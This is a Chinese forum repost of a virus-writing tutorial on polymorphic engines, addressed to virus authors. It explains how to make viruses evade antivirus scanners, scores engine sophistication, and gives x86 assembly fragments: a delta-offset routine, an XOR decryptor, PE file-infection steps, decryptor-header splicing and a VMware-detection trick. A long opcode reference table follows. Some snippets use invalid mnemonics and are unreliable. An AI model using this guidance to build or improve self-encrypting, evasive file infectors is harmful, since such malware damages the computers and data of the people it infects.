
# 理论变形学

> 原文：[`www.pediy.com/kssd/pediy08/pediy8-161.htm`](https://www.pediy.com/kssd/pediy08/pediy8-161.htm)

引用: `kanxue` 发布

多态变形技术的发展和形成，最早在计算机病毒中得到体现。为了使病毒代码躲避扫描程序的监察，不断对自身的执行代码进行变换，尽量隐藏扫描程序依据的病毒特征代码，从而使得扫描程序无法正确侦测和清除该病毒。而现在越来的软件保护也采用了类似技术，例如常见的 `Asprotect` 等，因此有必要了解一下这方面的技术。

国外一些病毒站点有这方面的文章，希望大家能推荐一些优秀的变态引擎的文章，然后整理后放到『外文翻译区』 版块组织翻译。

也欢迎你就这技术的实现及应用在这展开讨论。

下面是我刚找到的 2 篇讲解变形引擎的文章：

........

我这有几篇很久以前 `CVC` 上的关于病毒多态的文章，有兴趣可以看看。只是有点深，以看学现在的人群而言，能看懂的人估计不多了！！呵呵

============================================================================================================================================

# 理论变形学

## 第一讲：序

"No matter death or live,I would be on your sides forever."

——James·Raynor

在很久很久以前，在遥远遥远的星系中，我想写一篇关于变形的纯理论的文章，于是随着时间的推移，终于这篇文章诞生了......

## 一.变形学的基础伦理

### (一).做 Poly 的条件

"To Poly or not to Poly,it is a problem for a vxer."

——Vxk

是否想要做 `Poly`，一要看 `Vxer` 的想法，而是必要性——`if vxer` 一定要 `poly`，那么有没有必要就不重要了，不过如果有如下其中一种情况则非做 `poly` 不可。

1. 你借用了大量他人的代码，其中一些代码很出名！(那样的话,`Aver` 会很快找到查杀方法)
2. 你的病毒在编译时就被 `NAV` 提醒有问题。
3. 你的病毒在测试时被金山报警(被瑞星报警的 `polyVirus` 也很多，所以暂时不管他)，这样的病毒最好重写。
4. 你的病毒过分简单：：搜索磁盘文件+感染+`PayLoad`：`uses MessageBoxA()` (太没咬头了，`Aver` 会在半小时内 `XX` 掉它)。
5. 你的病毒出奇的巨型:这样大也就不在乎再大一点了(`Aver` 会很注意这样东西)。
6. 你的病毒要潜伏一个星期！！！(一般没 `Poly` 的 `Virus`，`Aver` 一个小时就会 `XX` 掉了——一个星期别开了)。

好了暂时就这些了，你的病毒如果没上面的问题——奇怪了，你用的是 `Ring0Virus Tech`?

hehe,我需要讲一下哪几种情况千万不要 `Poly`:

1. `Ring0` 病毒::用 `Poly` 会发生一些可爱的错误，除非你对 `ring0` 十分了解。
2. 试验型病毒::你只是要实验新技术，没必要用 `poly`,那样会影响实验的。
3. 礼物型病毒::你想让你的朋友痛苦吗？那就用 `Poly` 吧(你的朋友是 `AVER`, 那就用，看看他的水平如何？)

OK,这就是 `Poly` 的条件了。

下面，我们要看看 `Poly` 的等级划分了。

### (二)给 poly 打分的计算方法

"It is hard for an aver to recode and kill an eight-level-mark poly virus."

——Vxk

通常拿到一个 `Virus` 放进 `VM`，得到反汇编的代码——如果有 `poly`，(`AVERZ`)我们会给 `poly` 打分。打分是一种划分 `poly` 等级的通用方法::

开始计分为：0 分

打分标准：：

1. 有多随机种子选取系统，+0.5 分(以下就不写分字了)
2. 有随机寄存器和加密算法选取(注意是选取),+0.5
3. 有随机垃圾代码生成,+0.5
4. 有加密算法自生成，+0.5
5. 生成加密算法大小大于 `0.5KB`,+0.5
6. 能随机插入抗静态反汇编代码，+0.5
7. 能调整非加解密部分的代码所用寄存器的,+0.5
8. 能对 `Poly Engine` 部分的代码可进行部分代码称块状的随机加密变形,+0.5
9. 能够进行代码压缩的，+0.5
10. 压缩使用多种算法随机选取，+0.5
11. 能进行分块时代码压缩,+0.5
12. 能对全部代码实现分块式随机加密变形，+0.5
13. 具有多 `poly` 的多层壳结构块式变形能力，+1
14. 具有遗传演化变形能力,+1
15. 使用 `64` 位指令系统，如 `SSE`, `MMX`, `3d!now` 等等，+1
16. 使用抗 `VM` 分析的特殊代码，+1

总共 10 分，能够取得 5-6 分就是不错的 `polyVirus` 了(什么得了 10 分？你写的！？救护车！！)

OK.在此基础上，我们来划分 `poly` 的种类

* 分值 0 1.5 2 3 4 4.5 5 6 7 8 9 10
* 等级 -1 0 1 1.5 2 3 4.5 5 5.5 6 7 8
* 产生概率 100% 95% 90% 87% 80% 80% 76.5% 45% 21.35% 12.1% 2% 0.001%

注释：：

等级按破除病毒所需的时间而算：：

设 `Xl` 为等级，`VMp` 为 `VM` 的效率
`TK` 为解除时间(小时) ,代码编写效率为 `pC`
`CAV` 为协同工作 `AVer` 数量(通常为一)
`TK=(2.4*ABS(XL)/CAV+2.5+ABS(XL)/VMp)/pC`

生产概率按每一百职业 `VXERZ` 算。

### (三)写 poly 的一些基础准备

"No matter knowing or unkowning,I will tell you the way there"

——Zetarul

如何去写一个 `Poly` 是一个很重要的问题，通常写 `Poly` 之前都要有几个准备工作：：

1. 一本 `Intel i386` 的手册，一本 `AMD` 手册
2. `x86` 汇编手册(如果你对 `ASM` 了如指掌，就免了)
3. `Poly` 的等级定位，如同做游戏一样，你不能一开始就写一个 `StartCraft` 出来。所以建议定位到 3-4.5 就行了。(8!?你发疯了？？)

OK，现在给出一个 `PolyVirus` 的构架，下一章我们将讲 `Poly` 的一些技术问题
；引自 `pkxp` 的贴子

#### 1. 定位

```
Call Delta
Delta:
pop ebp
sub ebp,offset Delta
mov dword ptr [ebp+appBase],ebp
```

#### 2. 解密代码

```
lea edi , [ebx + offset EncryptStart]
mov ecx , VEnd - EncryptStart

DecryptLoop:
xor byte ptr [edi] , 00h   
key=byte ptr $-1
inc edi
loop DecryptLoop     


EncryptStart:         
call GetKBase        ;得到 hKernel
call GetAPIz         ;得到 api 地址               
```

#### 2. 感染一个文件

1) 分析合法性
2) 添加一个节
3) 这里不能直接写入病毒代码，要如下工作：

   a. `pMem=VirtualAlloc(VEnd-VStart...)`
   
   b. `mov esi,offset VStart`
      `mov edi,pMem`
      `mov ecx,VEnd-VStart`
      `rep movsb ;移动病毒代码到新开辟区`
      `eax = pMem + (Key-VStart)`
      `mov eax,11h ;key=11h`
      `esi = pMem + (EncryptStart-VStart)`
      `edi = esi`
      `;下面循环`
      `loadsb`
      `xor al,11h ;key`
      `stosb`
   
   c. `WriteFile(pMem...VEnd-VStart)`
      此时写入的是加密代码。

## 二。Poly 的实际编写时遇到的问题的解决方法与方案

### (一)插入一段代码的方法

"En Taro Adun,thanx to the AuirSha.You're alive now."

——Vxk

有上可以看到 `Poly` 的关键是插入解密代码(变形恢复？不必要吧)
那么要如何才能插入一段代码呢？现在让我来告诉你们：：主要用到两个指令 `Movsy` 和 `Stosy`(y=b/w)

看看这个代码：：

```
CLD;调整地址，很重要，有时不必要写这个
lea edi,[ebp+offset Decry]
;将 Decry 的地址装入 edi
mov eax,0h
mov ecx,[ebp+Decry_len];装入 DEcry 的大小
rep stosy
；清空 Decry 的内容
；这是为了重新写入新的代码
lea edi,[ebp+offset Decry]
mov esi,NewDeCry_addr
mov ecx,DEcry_len
rep movsy
；不用讲了吧
```

这段代码将定长的 `DEcry` 清除，写入新的 `Decry`，不过有些缺点::
只适合预先留好空隙的 `Virus`,just like this code

```
VStart:
Call gdelta
@I0:db MAX_Length dup (90h)
gdelta:
pop ebp
lea ebp,[ebp-offset gdelta]
@I1:db 256 dup (90h)
V_Real:
@I2:Max_length dup (90h)
```

这样一堆一堆的 `Nop` 看的就不舒服，而且 `AVER` 只要在特定位置 `XX` 你的 `DEcry` 就 `OK` 了。

那么怎样改进呢？

hh~~,这个简单你难道不知道吗？看下一段吧。

### (二)代码整合的问题的解决方法

"Benny,I think it very hard for me to anti your code."

——Vxk

上回说到 `Poly` 的代码不留空隙的解决方法，这个确实是一个难题
很少有人真的想过，不过你看过 `Virus` 的代码吧？知道非 `EPO` 的 `Virus` 返回时的方法吧？？？什么太古老不记得了？吐血了，没关系看下面的

这段代码，它是一个 `poly` 的部分代码::

```
；假设 V_Data_Addr 为加密后病毒代码的地址
；V_len 为加密后病毒代码的大小 
；CRY_len 为 DEcry 代码的大小 
；CRY_Data_Addr 为 DEcry 代码的地址
; host_addr 为 Host 返回地址
Call    DoPoly；调用加密变形模块
mov eax,decry_header_len
add eax,1h
add eax,decry_len
add eax,1h
add eax,v_len
mov [ebp+V_To_Write_len],eax；重新计算病毒大小
```



```asm
push    PAGE_READWRITE
push    MEM_RESERVE or MEM_COMMIT
push    V_len
push    0

Call dword ptr [ebp+_VirtualAlloc]
mov     pMem, eax
mov     edi, eax            ;edi 指向新开辟的内存
lea esi,[ebp+offset decry_Header]
mov ecx,decry_header_len
mov [ebp+Addr_R_cry],decry_header_len+1h
mov [ebp+Addr_V_begin],decry_header+decry_len+2h
rep movsy
inc edi
mov esi,decry_data_addr
mov ecx,decry_len
rep movsy
inc edi
mov esi,v_data_addr
mov ecx,v_len
mov [ebp+Host_op],host_addr
rep movsy
Call WriteVirusBack;返回去写文件
ret

Decry_header:
    pushad
    Call header_delta

header_delta:
    pop ebp
    lea ebp,[ebp-offset header_delta]
    mov eax,12345678h
    addr_r_cry=$-4
    push eax
    mov eax,12345678h
    addr_v_begin=$-4
    mov [ebp+Virus_addr],eax
    mov eax,87654321h
    Key_Door=$-4
    mov ebx,eax
    mov eax,12345678h
    V_size=$-4
    mov ecx,eax
    pop eax
    jmp short eax;调用 DeCry 的真正代码。

decry_header_end:
decry_len equ decry_header_end-decry_header
;剩下的相信你会做的
```

这是一个解决的方法，虽然不是最好的方法，不过已经可以适用于我们的 `poly` 了。

### (三)动态代码生成技术中的难题

> "Active on time, it is a great problem for a virus coder."
>
> ——Jhon.A

难点主要有代码大小的计算和代码生成两个部分：

这里就不再写代码来描述解决方案了，主要就是两个字:手册，你想写得绝妙，就把一本 `intel i386` 指令集手册的机器码及大小写进去吧...目前还没有好方法。

### 附：

| 机器码 | 指令 |
| :--- | :--- |
| `00` | `ADD` |
| `01` | `ADD` |
| `02` | `ADD` |
| `03` | `ADD` |
| `04` | `ADD` |
| `05` | `ADD` |
| `06` | `PUSH` |
| `07` | `POP` |
| `08` | `OR` |
| `09` | `OR` |
| `0A` | `OR` |
| `0B` | `OR` |
| `0C` | `OR` |
| `0D` | `OR` |
| `0E` | `PUSH` |
| `0F 00` | `LLDT` |
| `0F 00` | `LTR` |
| `0F 00` | `SLDT` |
| `0F 00` | `STR` |
| `0F 00` | `VERR` |
| `0F 00` | `VERW` |
| `0F 01` | `INVLPG` |
| `0F 01` | `LGDT` |
| `0F 01` | `LIDT` |
| `0F 01` | `LMSW` |
| `0F 01` | `SGDT` |
| `0F 01` | `SIDT` |
| `0F 01` | `SMSW` |
| `0F 02` | `LAR` |
| `0F 03` | `LSL` |
| `0F 08` | `INVD` |
| `0F 09` | `WBINVD` |
| `0F 0B` | `UD2` |
| `0F 20` | `MOV` |
| `0F 21` | `MOV` |
| `0F 22` | `MOV` |
| `0F 23` | `MOV` |
| `0F 30` | `WRMSR` |
| `0F 31` | `RDTSC` |
| `0F 32` | `RDMSR` |
| `0F 33` | `RDPMC` |
| `0F 40` | `CMOVO` |
| `0F 41` | `CMOVNO` |
| `0F 42` | `CMOVB` |
| `0F 42` | `CMOVC` |
| `0F 42` | `CMOVNAE` |
| `0F 43` | `CMOVAE` |
| `0F 43` | `CMOVNB` |
| `0F 43` | `CMOVNC` |
| `0F 44` | `CMOVE` |
| `0F 44` | `CMOVZ` |
| `0F 45` | `CMOVNE` |
| `0F 45` | `CMOVNZ` |
| `0F 46` | `CMOVBE` |
| `0F 46` | `CMOVNA` |
| `0F 47` | `CMOVA` |
| `0F 47` | `CMOVNBE` |
| `0F 48` | `CMOVS` |
| `0F 49` | `CMOVNS` |
| `0F 4A` | `CMOVP` |
| `0F 4A` | `CMOVPE` |
| `0F 4B` | `CMOVNP` |
| `0F 4B` | `CMOVPO` |
| `0F 4C` | `CMOVL` |
| `0F 4C` | `CMOVNGE` |
| `0F 4D` | `CMOVGE` |
| `0F 4D` | `CMOVNL` |
| `0F 4E` | `CMOVLE` |
| `0F 4E` | `CMOVNG` |
| `0F 4F` | `CMOVG` |
| `0F 4F` | `CMOVNLE` |
| `0F 60` | `PUNPCKLBW` |
| `0F 61` | `PUNPCKLWD` |
| `0F 62` | `PUNPCKLDQ` |
| `0F 63` | `PACKSSWB` |
| `0F 64` | `PCMPGTB` |
| `0F 65` | `PCMPGTW` |
| `0F 66` | `PCMPGTD` |
| `0F 67` | `PACKUSWB` |
| `0F 68` | `PUNPCKHBW` |
| `0F 69` | `PUNPCKHWD` |
| `0F 6A` | `PUNPCKHDQ` |
| `0F 6B` | `PACKSSDW` |
| `0F 6E` | `MOVD` |
| `0F 6F` | `MOVQ` |
| `0F 71` | `PSLLW` |
| `0F 71` | `PSRAW` |
| `0F 71` | `PSRLW` |
| `0F 72` | `PSLLD` |
| `0F 72` | `PSRAD` |
| `0F 72` | `PSRLD` |
| `0F 73` | `PSLLQ` |
| `0F 73` | `PSRLQ` |
| `0F 74` | `PCMPEQB` |
| `0F 75` | `PCMPEQW` |
| `0F 76` | `PCMPEQD` |
| `0F 77` | `EMMS` |
| `0F 7E` | `MOVD` |
| `0F 7F` | `MOVQ` |
| `0F 80` | `JO` |
| `0F 81` | `JNO` |
| `0F 82` | `JB` |
| `0F 82` | `JC` |
| `0F 82` | `JNAE` |
| `0F 83` | `JAE` |
| `0F 83` | `JNB` |
| `0F 83` | `JNC` |
| `0F 84` | `JE` |
| `0F 84` | `JZ` |
| `0F 85` | `JNE` |
| `0F 85` | `JNZ` |
| `0F 86` | `JBE` |
| `0F 86` | `JNA` |
| `0F 87` | `JA` |
| `0F 87` | `JNBE` |
| `0F 88` | `JS` |
| `0F 89` | `JNS` |
| `0F 8A` | `JP` |
| `0F 8A` | `JPE` |
| `0F 8B` | `JNP` |
| `0F 8B` | `JPO` |
| `0F 8C` | `JL` |
| `0F 8C` | `JNGE` |
| `0F 8D` | `JGE` |
| `0F 8D` | `JNL` |
| `0F 8E` | `JLE` |
| `0F 8E` | `JNG` |
| `0F 8F` | `JG` |
| `0F 8F` | `JNLE` |
| `0F 90` | `SETO` |
| `0F 91` | `SETNO` |
| `0F 92` | `SETB` |
| `0F 92` | `SETC` |
| `0F 92` | `SETNAE` |
| `0F 93` | `SETAE` |
| `0F 93` | `SETNB` |
| `0F 93` | `SETNC` |
| `0F 94` | `SETE` |
| `0F 94` | `SETZ` |
| `0F 95` | `SETNE` |
| `0F 95` | `SETNZ` |
| `0F 96` | `SETBE` |
| `0F 96` | `SETNA` |
| `0F 97` | `SETA` |
| `0F 97` | `SETNBE` |
| `0F 98` | `SETS` |
| `0F 99` | `SETNS` |
| `0F 9A` | `SETP` |
| `0F 9A` | `SETPE` |
| `0F 9B` | `SETNP` |
| `0F 9B` | `SETPO` |
| `0F 9C` | `SETL` |
| `0F 9C` | `SETNGE` |
| `0F 9D` | `SETGE` |
| `0F 9D` | `SETNL` |
| `0F 9E` | `SETLE` |
| `0F 9E` | `SETNG` |
| `0F 9F` | `SETG` |
| `0F 9F` | `SETNLE` |
| `0F A0` | `PUSH` |
| `0F A1` | `POP` |
| `0F A3` | `BT` |
| `0F A4` | `SHLD` |
| `0F A5` | `SHLD` |
| `0F A8` | `PUSH` |
| `0F A9` | `POP` |
| `0F AA` | `RSM` |
| `0F AB` | `BTS` |
| `0F AC` | `SHRD` |
| `0F AD` | `SHRD` |
| `0F AF` | `IMUL` |
| `0F B0` | `CMPXCHG` |
| `0F B1` | `CMPXCHG` |
| `0F B2` | `LSS` |
| `0F B3` | `BTR` |
| `0F B4` | `LFS` |
| `0F B5` | `LGS` |
| `0F B6` | `MOVZX` |
| `0F B7` | `MOVZX` |
| `0F BA` | `BT` |
| `0F BA` | `BTC` |
| `0F BA` | `BTR` |
| `0F BA` | `BTS` |
| `0F BB` | `BTC` |
| `0F BC` | `BSF` |
| `0F BD` | `BSR` |
| `0F BE` | `MOVSX` |
| `0F BF` | `MOVSX` |
| `0F C0` | `XADD` |
| `0F C1` | `XADD` |
| `0F C7` | `CMPXCHG8B` |
| `0F C8` | `BSWAP` |
| `0F D1` | `PSRLW` |
| `0F D2` | `PSRLD` |
| `0F D3` | `PSRLQ` |
| `0F D8` | `PSUBUSB` |
| `0F D9` | `PSUBUSW` |
| `0F DB` | `PAND` |
| `0F DC` | `PADDUSB` |
| `0F DD` | `PADDUSW` |
| `0F DF` | `PANDN` |
| `0F E1` | `PSRAW` |
| `0F E2` | `PSRAD` |
| `0F E5` | `PMULHW` |
| `0F E8` | `PSUBSB` |
| `0F E9` | `PSUBSW` |
| `0F EB` | `POR` |



0F EC PADDSB

0F ED PADDSW

0F EF PXOR

0F F1 PSLLW

0F F2 PSLLD

0F F3 PSLLQ

0F F5 PMADDWD

0F F8 PSUBB

0F F9 PSUBW

0F FA PSUBD

0F FC PADDB

0F FD PADDW

0F FE PADDD

10 ADC

11 ADC

12 ADC

13 ADC

14 ADC

15 ADC

16 PUSH

17 POP

18 SBB

19 SBB

1A SBB

1B SBB

1C SBB

1D SBB

1E PUSH

1F POP

20 AND

21 AND

22 AND

23 AND

24 AND

25 AND

27 DAA

28 SUB

29 SUB

2A SUB

2B SUB

2C SUB

2D SUB

2F DAS

30 XOR

31 XOR

32 XOR

33 XOR

34 XOR

35 XOR

37 AAA

38 CMP

39 CMP

3A CMP

3B CMP

3C CMP

3D CMP

3F AAS

40 INC

48 DEC

50 PUSH

58 POP

60 PUSHA

60 PUSHAD

61 POPA

61 POPAD

62 BOUND

63 ARPL

68 PUSH

69 IMUL

6A PUSH

6B IMUL

6C INS

6C INSB

6D INS

6D INSD

6D INSW

6E OUTS

6E OUTSB

6F OUTS

6F OUTSD

6F OUTSW

70 JO

71 JNO

72 JB

72 JC

72 JNAE

73 JAE

73 JNB

73 JNC

74 JE

74 JZ

75 JNE

75 JNZ

76 JBE

76 JNA

77 JA

77 JNBE

78 JS

79 JNS

7A JP

7A JPE

7B JNP

7B JPO

7C JL

7C JNGE

7D JGE

7D JNL

7E JLE

7E JNG

7F JG

7F JNLE

80 ADC

80 ADD

80 AND

80 CMP

80 OR

80 SBB

80 SUB

80 XOR

81 ADC

81 ADD

81 AND

81 CMP

81 OR

81 SBB

81 SUB

81 XOR

83 ADC

83 ADD

83 AND

83 CMP

83 OR

83 SBB

83 SUB

83 XOR

84 TEST

85 TEST

86 XCHG

87 XCHG

88 MOV

89 MOV

8A MOV

8B MOV

8B MOV

8C MOV

8D LEA

8E MOV

8F POP

90 NOP

90 XCHG

98 CBW

98 CWDE

99 CDQ

99 CWD

9A CALL

9A CALL

9B D9 FSTCW

9B D9 FSTENV

9B DB E2 FCLEX

9B DB E3 FINIT

9B DD FSAVE

9B DD FSTSW

9B DF E0 FSTSW

9B FWAIT

9B WAIT

9C PUSHF

9C PUSHFD

9D POPF

9D POPFD

9E SAHF

9F LAHF

A0 MOV

A1 MOV

A2 MOV

A3 MOV

A4 MOVS

A4 MOVSB

A5 MOVS

A5 MOVSD

A5 MOVSW

A6 CMPS

A6 CMPSB

A7 CMPS

A7 CMPSD

A7 CMPSW

A8 TEST

A9 TEST

AA STOS

AA STOSB

AB STOS

AB STOSD

AB STOSW

AC LODS

AC LODSB

AD LODS

AD LODSD

AD LODSW

AE SCAS

AE SCASB

AF SCAS

AF SCASD

AF SCASW

B0 MOV

B8 MOV

C0 RCL

C0 RCR

C0 ROL

C0 ROR

C0 SAL

C0 SAR

C0 SHL

C0 SHR

C1 RCL

C1 RCR

C1 ROL

C1 ROR

C1 SAL

C1 SAR

C1 SHL

C1 SHR

C2 RET

C3 RET

C4 LES

C5 LDS

C6 MOV

C7 MOV

C8 00 ENTER

C8 01 ENTER

C8 ENTER

C9 LEAVE

CA RET

CC INT

CD INT

CE INTO

CF IRET

CF IRETD

D0 RCL

D0 RCR

D0 ROL

D0 ROR

D0 SAL

D0 SAR

D0 SHL

D0 SHR

D1 RCL

D1 RCR

D1 ROL

D1 ROR

D1 SAL

D1 SAR

D1 SHL

D1 SHR

D2 RCL

D2 RCR

D2 ROL

D2 ROR

D2 SAL

D2 SAR

D2 SHL

D2 SHR

D3 RCL

D3 RCR

D3 ROL

D3 ROR

D3 SAL

D3 SAR

D3 SHL

D3 SHR

D4 (No mnemonic)

D4 0A AAM

D5 (No mnemonic)

D5 0A AAD

D7 XLAT

D7 XLATB

D8 C0 FADD

D8 C8 FMUL

D8 D0 FCOM

D8 D1 FCOM

D8 D8 FCOMP

D8 D9 FCOMP

D8 E0 FSUB

D8 E8 FSUBR

D8 F0 FDIV

D8 F8 FDIVR

D8 FADD

D8 FCOM

D8 FCOMP

D8 FDIV

D8 FDIVR

D8 FMUL

D8 FSUB

D8 FSUBR

D9 C0 FLD

D9 C8 FXCH

D9 C9 FXCH

D9 D0 FNOP

D9 E0 FCHS

D9 E1 FABS

D9 E4 FTST

D9 E8 FLD1

D9 E9 FLDL2T

D9 EA FLDL2E

D9 EB FLDPI

D9 EC FLDLG2

D9 ED FLDLN2

D9 EE FLDZ

D9 F0 F2XM1

D9 F2 FPTAN

D9 F3 FPATAN

D9 F4 FXTRACT

D9 F5 FPREM1

D9 F6 FDECSTP

D9 F7 FINCSTP

D9 F9 FYL2XP1

D9 FA FSQRT

D9 FB FSINCOS

D9 FC FRNDINT

D9 FD FSCALE

D9 FE FSIN

D9 FF FCOS

D9 FLD

D9 FLDCW

D9 FLDENV

D9 FNSTCW

D9 FNSTENV

D9 FST

D9 FSTP

DA C0 FCMOVB

DA C8 FCMOVE

DA D0 FCMOVBE

DA D8 FCMOVU

DA E9 FUCOMPP

DA FIADD

DA FICOM

DA FICOMP

DA FIDIV

DA FIDIVR

DA FIMUL

DA FISUB

DA FISUBR



`DB C0 FCMOVNB`

`DB C8 FCMOVNE`

`DB D0 FCMOVNBE`

`DB D8 FCMOVNU`

`DB E2 FNCLEX`

`DB E3 FNINIT`

`DB E8 FUCOMI`

`DB F0 FCOMI`

`DB FILD`

`DB FIST`

`DB FISTP`

`DB FLD`

`DB FSTP`

`DC C0 FADD`

`DC C8 FMUL`

`DC E0 FSUBR`

`DC E8 FSUB`

`DC F0 FDIVR`

`DC F8 FDIV`

`DC FADD`

`DC FCOM`

`DC FCOMP`

`DC FDIV`

`DC FDIVR`

`DC FMUL`

`DC FSUB`

`DC FSUBR`

`DD C0 FFREE`

`DD D0 FST`

`DD D8 FSTP`

`DD E0 FUCOM`

`DD E1 FUCOM`

`DD E8 FUCOMP`

`DD E9 FUCOMP`

`DD FLD`

`DD FNSAVE`

`DD FNSTSW`

`DD FRSTOR`

`DD FST`

`DD FSTP`

`DE C0 FADDP`

`DE C1 FADDP`

`DE C8 FMULP`

`DE C9 FMULP`

`DE D9 FCOMPP`

`DE E0 FSUBRP`

`DE E1 FSUBRP`

`DE E8 FSUBP`

`DE E9 FSUBP`

`DE F0 FDIVRP`

`DE F1 FDIVRP`

`DE F8 FDIVP`

`DE F9 FDIVP`

`DE FIADD`

`DE FICOM`

`DE FICOMP`

`DE FIDIV`

`DE FIDIVR`

`DE FIMUL`

`DE FISUB`

`DE FISUBR`

`DF E0 FNSTSW`

`DF E8 FUCOMIP`

`DF F0 FCOMIP`

`DF FBLD`

`DF FBSTP`

`DF FILD`

`DF FIST`

`DF FISTP`

`E0 LOOPNE`

`E0 LOOPNZ`

`E1 LOOPE`

`E1 LOOPZ`

`E2 LOOP`

`E3 JCXZ`

`E3 JECXZ`

`E4 IN`

`E5 IN`

`E6 OUT`

`E7 OUT`

`E8 CALL`

`E9 JMP`

`EA JMP`

`EB JMP`

`EC IN`

`ED IN`

`EE OUT`

`EF OUT`

`F0 LOCK`

`F2 A6 REPNE`

`F2 A7 REPNE`

`F2 AE REPNE`

`F2 AF REPNE`

`F3 6C REP`

`F3 6D REP`

`F3 6E REP`

`F3 6F REP`

`F3 A4 REP`

`F3 A5 REP`

`F3 A6 REPE`

`F3 A7 REPE`

`F3 AA REP`

`F3 AB REP`

`F3 AC REP`

`F3 AD REP`

`F3 AE REPE`

`F3 AF REPE`

`F4 HLT`

`F5 CMC`

`F6 DIV`

`F6 IDIV`

`F6 IMUL`

`F6 MUL`

`F6 NEG`

`F6 NOT`

`F6 TEST`

`F7 DIV`

`F7 IDIV`

`F7 IMUL`

`F7 MUL`

`F7 NEG`

`F7 NOT`

`F7 TEST`

`F8 CLC`

`F9 STC`

`FA CLI`

`FC CLD`

`FD STD`

`FE DEC`

`FE INC`

`FF CALL`

`FF DEC`

`FF INC`

`FF JMP`

`FF PUSH`

### (四) 一些深入的技术难题

1. 压缩
2. 指令分析
3. 分块技术
4. 遗传变异：这个涉及到 `Debugger` 和即时反汇编技术(分析别的病毒获得新的东西，吐血！)
5. 抗 `VM` 分析：这个还是给出来吧...

```asm
mov     ecx, 0Ah    ; CX=function# (0Ah=get_version)
mov     eax, 'VMXh' ; EAX=magic
mov     dx, 'VX'    ; DX=magic
in      eax, dx     ; specially processed io cmd
; output: EAX/EBX/ECX = data
cmp     ebx, 'VMXh' ; also eax/ecx modified (maybe vmw/os ver?)
je      under_VMWare
```

前四个将在以后的理论变形学里讲解。

"Let's have a rest now."

——Vxk

SEE YOU NEXT TIME.

下一次的内容介绍：

1. 随机数的生成
2. 如何分块？
3. 4. 5. 未定.. 4dd466d0e1e0cc123afbe504da2462ca
